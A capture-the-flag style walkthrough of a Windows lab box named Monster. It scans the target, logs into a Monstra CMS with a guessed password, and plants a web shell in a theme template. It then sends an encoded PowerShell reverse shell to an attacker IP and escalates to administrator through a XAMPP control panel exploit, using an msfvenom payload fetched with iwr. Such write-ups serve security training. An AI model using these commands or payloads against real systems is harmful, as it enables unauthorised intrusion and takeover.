---
icon: windows
---

# Monster - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.180 -oN scans/nmap-tcpall                                                                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 19:31 EDT                                                                                     
Nmap scan report for 192.168.231.180                                                                                                                
Host is up (0.029s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Mike Wazowski
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Mike Wazowski
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Mike-PC
| Not valid before: 2025-10-05T23:31:33
|_Not valid after:  2026-04-06T23:31:33
| rdp-ntlm-info: 
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2025-10-06T23:35:27+00:00
|_ssl-date: 2025-10-06T23:35:42+00:00; +1s from scanner time.
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/6%OT=80%CT=1%CU=34225%PV=Y%DS=4%DC=T%G=Y%TM=68E4524
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=I%CI=I%TS=U)SEQ(SP=1
OS:01%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=106%GCD=1%ISR=108%TI=I%CI=I%TS=U)
OS:SEQ(SP=FE%GCD=1%ISR=106%TI=I%CI=I%TS=U)OPS(O1=M578NW8NNS%O2=M578NW8NNS%O
OS:3=M578NW8%O4=M578NW8NNS%O5=M578NW8NNS%O6=M578NNS)WIN(W1=FFFF%W2=FFFF%W3=
OS:FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%
OS:Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80
OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-06T23:35:32
|_  start_date: N/A

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   29.56 ms 192.168.45.1
2   29.68 ms 192.168.45.254
3   29.70 ms 192.168.251.1
4   30.25 ms 192.168.231.180
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (429).png" alt=""><figcaption></figcaption></figure>

#### Directory Busting

```
dirsearch -u 192.168.231.180
```

<figure><img src="../../.gitbook/assets/image (430).png" alt=""><figcaption></figcaption></figure>

Navigating to blog we see a version as well as a link that redirects us to a domain name let's add it and check it out

<figure><img src="../../.gitbook/assets/image (431).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (432).png" alt=""><figcaption></figcaption></figure>

```
192.168.231.180	monster.pg
```

<figure><img src="../../.gitbook/assets/image (433).png" alt=""><figcaption></figcaption></figure>

Searchsploit reveals 2 RCE's amoung other exploits

<figure><img src="../../.gitbook/assets/image (434).png" alt=""><figcaption></figcaption></figure>

I need credentials to get RCE

Clicking on the sitemap, we can see a users extension

<figure><img src="../../.gitbook/assets/image (435).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (436).png" alt=""><figcaption></figcaption></figure>

We can see 2 users!

The about us section from [http://192.168.231.180/](http://192.168.165.180/), might containt clues to a password

<figure><img src="../../.gitbook/assets/image (437).png" alt=""><figcaption></figcaption></figure>

and it did

```
admin:wazowski
```

<figure><img src="../../.gitbook/assets/image (438).png" alt=""><figcaption></figcaption></figure>

Clicking on Administration we get redirected to the following page

<figure><img src="../../.gitbook/assets/image (439).png" alt=""><figcaption></figcaption></figure>

Now Let's get RCE

<figure><img src="../../.gitbook/assets/image (440).png" alt=""><figcaption></figcaption></figure>

editing default template of the CMS

<figure><img src="../../.gitbook/assets/image (441).png" alt=""><figcaption></figcaption></figure>

The Github page of [**Monstra CMS**](http://monster.pg/blog/public/themes/default/blog.template.php) is open source and can be accessed

<figure><img src="../../.gitbook/assets/image (442).png" alt=""><figcaption></figcaption></figure>

Found a location to place our malicious php file.

```
http://monster.pg/blog/public/themes/default/blog.template.php?cmd=whoami
```

<figure><img src="../../.gitbook/assets/image (443).png" alt=""><figcaption></figcaption></figure>

Let's get a reverse shell, Ill use [https://www.revshells.com/](https://www.revshells.com/) to generate it

<figure><img src="../../.gitbook/assets/image (444).png" alt=""><figcaption></figcaption></figure>

Visit the below link and you will get a shell

```
http://monster.pg/blog/public/themes/default/blog.template.php?cmd=powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

<figure><img src="../../.gitbook/assets/image (445).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">**Winpeas**</mark>

<figure><img src="../../.gitbook/assets/image (446).png" alt=""><figcaption></figcaption></figure>

Winpeas revealed the running process `C:\xampp\apache\bin\httpd.exe` . Checking `C:\xampp\properties.ini` showed XAMPP version 7.3.10.

<figure><img src="../../.gitbook/assets/image (447).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (448).png" alt=""><figcaption></figcaption></figure>

```
searchsploit -m 50337
```

This exploit replaces the XAMPP Control Panel’s text editor with a malicious executable.

<mark style="color:yellow;">**First -> generate a reverse shell payload**</mark>

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=80 -f exe -o shell.exe
```

Then upload it to the machine

```
iwr -uri http://192.168.45.243/shell.exe -Outfile shell.exe
```

<figure><img src="../../.gitbook/assets/image (449).png" alt=""><figcaption></figcaption></figure>

Follow the exploit’s PowerShell commands to replace the `xampp-control.ini` configuration file. You should get a shell as administrator

<figure><img src="../../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>
